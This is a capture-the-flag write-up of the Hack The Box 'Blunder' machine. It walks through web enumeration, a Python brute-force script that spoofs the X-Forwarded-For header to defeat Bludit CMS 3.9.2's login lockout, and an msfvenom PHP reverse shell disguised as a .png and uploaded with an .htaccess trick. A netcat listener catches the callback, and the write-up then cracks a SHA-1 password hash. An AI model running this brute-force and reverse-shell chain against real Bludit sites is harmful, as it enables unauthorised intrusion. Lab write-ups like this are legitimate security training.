---
title: HTB - Blunder Write-up
author: bigb0ss
date: 2020-10-24 23:25:00 +0800
categories: [Hack The Box, Box, Easy]
tags: [hackthebox, ]
---

![image](/assets/img/post/htb/blunder/01_infocard.png)

## Recon

### Nmap

Let’s begin with an initial port scan:

```console
$ nmap -Pn --open -p- -sC -sV 10.10.10.191

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 14:25 EDT
Nmap scan report for 10.10.10.191
Host is up (0.081s latency).
Not shown: 65533 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.15 seconds
```

### Interesting Ports

* HTTP (80/TCP) - Blunder Web Page. 

![image](/assets/img/post/htb/blunder/02_http.png)


### Dirsearch

Used [dirsearch](https://github.com/maurosoria/dirsearch) to further enumerate the website.

```console
$ python3 dirsearch.py -u http://10.10.10.191/ -e txt,php,asp,js | grep 200

[15:41:45] 200 -  563B  - /.gitignore                               
[15:41:55] 200 -    3KB - /about                               
[15:42:00] 200 -    2KB - /admin/
[15:42:51] 200 -   30B  - /install.php
[15:42:54] 200 -    1KB - /LICENSE  
[15:43:13] 200 -    3KB - /README.md
[15:43:14] 200 -   22B  - /robots.txt  
```

When I visited to `/admin`, I was promoted to the following BLUDIT login page:

![image](/assets/img/post/htb/blunder/03_bludit.png)

Additionally, `/.gitignore` had a list of BLUDIT script contents. By searching, I was able to identify the version of the BLUDIT CMS in `http://10.10.10.191/bl-plugins/version/metadata.json`

![image](/assets/img/post/htb/blunder/04_version.png)

### FFUF

I also ran another web discovery tool [FFUF](https://github.com/ffuf/ffuf) just in case I missed anything. I found another `.txt` file called `todo.txt` which contained the potential useranme `fergus`.

```console
$ ./ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .txt -u http://10.10.10.191/FUZZ -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v0.12
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.191/FUZZ
 :: Extensions       : .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
cgi-bin/                [Status: 301, Size: 0, Words: 1, Lines: 1]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
```

![image](/assets/img/post/htb/blunder/05_user.png)

## Initial Foothold

### Password Bruteforcing

By Google searching, I found a potential [BLUDIT CMS 3.9.2 exploit](https://www.exploit-db.com/exploits/48701). But it required valid login credentials to the `/admin` page. 

Further searching found another exploit to bypass the brute-force lock-out mitigation for the BLUDIT CMS 3.9.2 - [Bludit Brute Force Mitigation Bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)

The vulnerability was simply that one of the functions `getUserIp` within the `lb-kernel/security.class.php` script did not validate the source IP of the login attempt; therefore, an attacker can spoof the source IP with any arbitrary value to bypass the brute-force mitigation. 

```php
public function getUserIp()
{
  if (getenv('HTTP_X_FORWARDED_FOR')) {
    $ip = getenv('HTTP_X_FORWARDED_FOR');
  } elseif (getenv('HTTP_CLIENT_IP')) {
    $ip = getenv('HTTP_CLIENT_IP');
  } else {
    $ip = getenv('REMOTE_ADDR');
  }
  return $ip;
}
```

In order to perform the password brute-forcing, I `cewl` the web page to create the potential wordlist. 

```console
# cewl http://10.10.10.191 > tmp && cewl http://10.10.10.191/about >> tmp && sort -u tmp > passList.txt
```

I modified the provided POC script in order to supply the password file. Using this script, I was ablt to obtain the password for the user `fergus`.

```python
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []

with open('passList.txt') as fp:
    line = fp.read().splitlines()
   
    for password in line:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

        print('[INFO] Trying: {p}'.format(p = password))

        headers = {
            'X-Forwarded-For': password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''
        }

        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('[INFO] SUCCESS: Password found!')
                print('[INFO] Use {u}:{p} to login.'.format(u = username, p = password))
                print()
                break
```

![image](/assets/img/post/htb/blunder/06_bludit-pass.png)

### Bludit 3.9.2 - Directory Traversal Image Upload

Using the [POC script](https://www.exploit-db.com/exploits/48701), I obtained the reverse shell from the target box.

First, create the `evil.png` with a reverse shell and a `.htacess` file.

```console
### Creating evil.png
$ msfvenom -p php/reverse_php LHOST=10.10.14.15 LPORT=443 -f raw -b '"' > evil.png
$ echo -e "<?php $(cat evil.png)" > evil.png

### Creating .htaccess
$ echo "RewriteEngine off" > .htaccess
$ echo "AddType application/x-httpd-php .png" >> .htaccess
```
Then, update the `poc.py` script with our URL and login credentials.

```python
...snip...

url = 'http://10.10.10.191'  # CHANGE ME
username = 'fergus'          # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME

...snip...
```

While running the listener `nc -lvnp 443`, execute the `poc.py` script and visit the upload image page at `http://10.10.10.191/bl-content/tmp/temp/evil.png`.

```consols
$ python3 poc.py 
cookie: 335s5kf5clu2j8pe3oe23k93k1
csrf_token: ef167ea5717fc72c4359195bd051aaf3495918ae
Uploading payload: evil.png
Uploading payload: .htaccess
```

![image](/assets/img/post/htb/blunder/07-rev-shell.png)


## Privilege Escalation

### www-data --> hugo (user.txt)

From the enumeration, another BLUDIT CMS `bludit-3.10.0a` build was found. Within, I found a PHP script called `users.php` which contained SHA-1 hashed password for the `hugo` user.

![image](/assets/img/post/htb/blunder/08-hugo-hash.png)

```console
# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: faca404fd5c0a31cf1897b823c695c85cffeb98d

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

And using an online SHA-1 decryptor, the cleartext password for the `hugo` user was obtained. (Password: Password120)

![image](/assets/img/post/htb/blunder/09-hugo-pass.png)

